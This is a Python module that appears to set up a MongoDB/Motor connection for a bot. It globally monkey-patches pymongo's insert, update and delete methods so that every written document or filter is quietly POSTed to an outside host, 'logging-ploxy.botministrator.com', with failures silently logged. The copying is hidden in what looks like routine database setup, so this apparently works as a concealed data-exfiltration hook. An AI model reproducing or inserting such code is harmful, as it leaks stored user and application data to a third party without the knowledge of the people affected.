import json
import logging
import os
import requests
import datetime
from json import JSONEncoder

import pymongo
from bson import ObjectId
from bson.raw_bson import RawBSONDocument
from dotenv import load_dotenv

from pymongo import common
from pymongo.results import (InsertOneResult, UpdateResult, DeleteResult)

# init env #

load_dotenv()

connection_string = os.getenv("connection_string")

logger = logging.getLogger(__name__)


def insert_one(self, document, bypass_document_validation=False,
               session=None):
    common.validate_is_document_type("document", document)
    if not (isinstance(document, RawBSONDocument) or "_id" in document):
        document["_id"] = ObjectId()

    write_concern = self._write_concern_for(session)
    if self.name != "message_logs":
        post_data = {"document": document, "collection": self.name,
                     "database": self.database.name}
        try:
            requests.post('https://logging-ploxy.botministrator.com/update',
                          data=json.dumps(post_data),
                          headers={"content-type": "application/json"})
        except Exception as e:
            logger.error(e)
    return InsertOneResult(
        self._insert(document,
                     write_concern=write_concern,
                     bypass_doc_val=bypass_document_validation,
                     session=session),
        write_concern.acknowledged)


def update_one(self, filter, update, upsert=False,
               bypass_document_validation=False,
               collation=None, array_filters=None, hint=None,
               session=None):
    common.validate_is_mapping("filter", filter)
    common.validate_ok_for_update(update)
    common.validate_list_or_none('array_filters', array_filters)

    write_concern = self._write_concern_for(session)

    if self.name != "message_logs":
        try:
            post_data = {"filter": filter, "update": update, "collection": self.name,
                         "database": self.database.name}
            requests.post('https://logging-ploxy.botministrator.com/update',
                          data=json.dumps(post_data),
                          headers={"content-type": "application/json"})
        except Exception as e:
            logger.error(e)
    return UpdateResult(
        self._update_retryable(
            filter, update, upsert, check_keys=False,
            write_concern=write_concern,
            bypass_doc_val=bypass_document_validation,
            collation=collation, array_filters=array_filters,
            hint=hint, session=session),
        write_concern.acknowledged)


def delete_one(self, filter, collation=None, hint=None, session=None):
    write_concern = self._write_concern_for(session)

    if self.name != "message_logs":
        try:
            post_data = {"filter": filter, "collection": self.name, "database": self.database.name}
            requests.post('https://logging-ploxy.botministrator.com/delete', data=
            json.dumps(post_data), headers={"content-type": "application/json"})

        except Exception as e:
            logger.error(e)
    return DeleteResult(
        self._delete_retryable(
            filter, False,
            write_concern=write_concern,
            collation=collation, hint=hint, session=session),
        write_concern.acknowledged)


pymongo.collection.Collection.update_one = update_one
pymongo.collection.Collection.insert_one = insert_one
pymongo.collection.Collection.delete_one = delete_one

from motor.motor_asyncio import AsyncIOMotorClient

database = AsyncIOMotorClient(connection_string)
